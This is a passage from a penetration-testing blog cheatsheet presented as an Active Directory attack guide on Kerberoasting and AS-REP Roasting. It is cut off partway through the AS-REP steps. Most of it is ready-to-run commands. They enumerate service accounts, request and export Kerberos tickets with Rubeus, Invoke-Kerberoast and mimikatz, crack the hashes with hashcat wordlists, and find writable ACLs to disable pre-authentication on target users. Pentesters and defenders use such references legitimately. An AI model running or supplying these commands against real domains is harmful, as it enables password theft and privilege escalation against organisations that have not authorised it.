---
title: Kerberoasting and AS-REP Roasting Cheatsheet
url: https://www.hackingdream.net/2025/12/kerberoasting-and-as-rep-roasting-cheatsheet.html
source: Hacking Dream
date: 2025-12-11
fetch_date: 2025-12-12T03:21:00.145673
---

# Kerberoasting and AS-REP Roasting Cheatsheet

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### Kerberoasting and AS-REP Roasting Cheatsheet

[December 12, 2025](https://www.hackingdream.net/2025/12/kerberoasting-and-as-rep-roasting-cheatsheet.html "permanent link")

Kerberoasting and AS-REP Roasting: The Ultimate Active Directory Attack Guide

# Kerberoasting and AS-REP Roasting: The Ultimate Active Directory Attack Guide

*Updated on December 12, 2025*

**Table of Contents**

* [1. Kerberoasting Fundamentals](#section-1)
* [2. AS-REP Roasting (Targeted Exploitation)](#section-2)
* [3. Targeted Kerberoasting (Set SPN)](#section-3)
* [4. Brute Forcing and Enumeration](#section-4)

[![Kerberoasting and AS-REP Roasting Cheatsheet](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZIfJD4pmnVSsys1lrFVjTlA_L7tAg6qzbDPCEeCSLMuAausex7m8zId9SdE81gal7F2LjJQyyIxCegQrSsAlvhQb4MSIZgsPIKRZA4Xe3JBnaoW4hl_rgll7N833BKdtcFkrop1RPtprf9ycd1jove1Bqi_4SGFsx38xWbRCXle4K5CuJCdzYhk2JZfbT/w640-h322/Kerberoasting-and-AS-REP-Roasting-Cheatsheet.jpg "Kerberoasting and AS-REP Roasting Cheatsheet")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZIfJD4pmnVSsys1lrFVjTlA_L7tAg6qzbDPCEeCSLMuAausex7m8zId9SdE81gal7F2LjJQyyIxCegQrSsAlvhQb4MSIZgsPIKRZA4Xe3JBnaoW4hl_rgll7N833BKdtcFkrop1RPtprf9ycd1jove1Bqi_4SGFsx38xWbRCXle4K5CuJCdzYhk2JZfbT/s1024/Kerberoasting-and-AS-REP-Roasting-Cheatsheet.jpg)

This guide covers advanced Active Directory attacks including Kerberoasting, AS-REP Roasting, and Targeted Kerberoasting. Below you will find a complete technical breakdown and command reference for these exploitation techniques, including modern Linux-based approaches.

## Kerberoasting

Kerberoasting is a technique that allows an attacker to steal the password hash of a service account. The attack exploits the Kerberos TGS-REQ packet exchange. Because any valid user can request a service ticket for any service, an attacker can extract the Ticket Granting Service (TGS) ticket from memory and attempt to crack it offline.

Save the TGS ticket to the disk and brute force it. DC identifies the service account by ServicePrincipalName but service accounts password are freaking hard to crack in most of the cases.

### Find users with SPN's set to their Accounts

#import the module and Find the users

```
Import-Module .\GetUserSPNs.ps1
```

or

#AD module

```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

or

#Poweview

```
Get-NetUser -SPN
```

### Get TGS Ticket Using GetUserSPNs.py

```
sudo GetUserSPNs.py -request -dc-ip 10.10.10.10 Steins.local/mark
```

### Get TGS Ticket Using AD Module

#request the TGS Ticket using AD Module, use the SPN name found using above commands

```
powershell.exe -exec bypass -c "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SPNNAME/hostname.steins.LOCAL:1433' "
```

### Get TGS Ticket Using PowerView

```
Request-SPNTicket
```

### Get TGS Ticket Using Invoke-Kerberoast

```
Import-Module .\Invoke-Kerberoast.ps1
```

#Generate the hash

```
Invoke-Kerberoast -OutputFormat Hashcat
```

### Get TGS Ticket Using Rubeus

```
.\Rubeus.exe kerberoast /domain:steins.local /user:username /format:hashcat /outfile:hash.txt
```

#Export the ticket from memory to disk using mimikatz

```
Invoke-Mimikatz -Command '"Kerberos::list /export"'
```

### Cracking the hash

```
hashcat -m 13100 -a 0 ticket.hashcat /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/T0XlC-insert_space_and_special_0_F.rule --force
```

or

```
hashcat -a 0 -m 13100 ticket.hashcat /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force
```

or

```
hashcat -a 0 -m 13100 hash ~/Downloads/Tools/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --force
```

or

```
hashcat -m 13100 krb5t_hash rockyou.txt --force
```

or

```
python tgscrack.py wordlist.txt hash.txt
```

## Targeted Kerberosting - AS-REPs Roasting

While often grouped with Kerberoasting, AS-REP Roasting is a distinct attack against users who do not require Kerberos pre-authentication. If this setting is enabled, an attacker can request an AS-REP ticket for that user and crack the encrypted chunk offline to recover the password.

Find users with -PreAuthNotRequiered set or users to which we have acecss to Genric All/Generic Write ACL set. Log generated is 4769 for Adding DoNotPre-Auth on target user.

### Step- 1 - Finding Users with PreAuth not required

(Skip to Step-5 if you find any users)

#Powerview - Finding users with PreauthNotRequired set

```
Get-DomainUser -PreauthNotRequired -Verbose
```

#AD Module - Finding users with PreauthNotRequired set

```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuths
```

#LDAPQuery - Finding users with PreAuth Not req

```
(&(UserAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))
```

### Step - 2 - Finding users to Abuse

#Finding Users with enough persmissions to modify acls

```
powerview_dev.ps1 Invoke-ACLScanner -ResolveGUIds | {$_.IdentityReferenceName -match "RDPUsers"}
```

#Finding Objects with GenericWrite

```
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite')}
```

#Finding users with GenericAll

```
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll')}
```

#or check if anything matches with your SID (for ease of access)

```
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1087654965-336889418-4984984984-1501')}
```

### Step - 3 Disabling Pre-Auth

#PowerView : Disabling PreAuth for Kerberos

```
Powerview.exe Set-DomainObject -Identity USER_NAME -XOR @{useraccountcontrol=4194304} -Verbose
```

#Using AD Module Disabling PreAuth for Kerberos

```
Set-ADAccountControl -Identity Administrator -doesnotrequirepreauth $true
```

#Method Using bloodyAD (Linux)

```
#Set Pre-auth for a TargetUser; -k is to use Kerberos auth; uses KRB5CCNAME ENV variable
bloodyAD --host dc01.domain.local -d "Domain.Local" --dc-ip 10.10.10.10 -k add uac TargetUserName -f DONT_REQ_PREAUTH
```

### Step - 4 - Validating the changes

#Find the users with PreAuth Not Required

```
Get-DomainUser -PreAuthNotRequired -Verbose
```

### Step - 5 - Getting the AS-REP

#Usi...